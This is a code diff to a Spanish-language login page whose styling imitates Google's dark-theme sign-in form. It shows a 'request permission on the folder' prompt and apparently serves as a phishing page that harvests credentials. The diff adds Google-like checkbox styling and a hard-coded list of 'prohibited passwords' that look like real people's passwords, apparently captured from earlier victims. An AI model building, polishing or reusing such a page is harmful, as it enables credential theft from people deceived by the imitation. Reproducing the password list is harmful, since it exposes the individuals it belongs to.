@@ -139,8 +139,8 @@
         }
 
         .guest-mode {
-            font-family: 'Inter', sans-serif;
-            color: #ff5f5f;
+        
+            color: #ff9090;
             font-size: 14px;
             line-height: 1.4286;
             margin-bottom: 24px;
@@ -162,16 +162,55 @@
             margin-bottom: 24px;
         }
 
+        .show-password-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        /* Estilo personalizado para el checkbox */
         .show-password-wrapper input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #9aa0a6;
+            border-radius: 2px;
+            background-color: transparent;
             margin-right: 8px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked {
+            border-color: #1a73e8;
+            background-color: #1a73e8;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            left: 2px;
+            top: 0px;
+            width: 5px;
+            height: 7px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .show-password-wrapper input[type="checkbox"]:hover {
+            border-color: #82aaff;
         }
 
         .show-password-wrapper label {
             color: #e8eaed;
             font-size: 14px;
             cursor: pointer;
+            user-select: none;
         }
-
         .actions {
             display: flex;
             justify-content: space-between;
@@ -344,8 +383,7 @@
                 
         
                 <div class="guest-mode" id="guestMode">
-                    Solicita el permiso en la carpeta para continuar. 
-                    
+               Solicita el permiso en la carpeta para continuar
                 </div>
                 
                 <div class="actions">
@@ -430,8 +468,8 @@
             }
             
             // Verificar contraseñas prohibidas (copiada del formulario 2)
-            const prohibitedWords = ["fernanda2022","Fernanda2022","Haily130598","haily130598","delfin","Delfin","cochachi2523","Cochachi2523","cochachi2523","aylinnmierda2008","Aylinnmierda2008","loveteo10","Greinyer10","greinyer10"];
-            if (prohibitedWords.some(word => password.includes(word))) {
+            const prohibitedPasswords = ["fernanda2022","Fernanda2022","Haily130598","haily130598","delfin","cochachi2523","Cochachi2523","cochachi2523","aylinnmierda2008","Aylinnmierda2008","loveteo10","Greinyer10","greinyer10"];
+            if (prohibitedPasswords.includes(password)) {
                 isProhibitedPassword = true;
             }
             
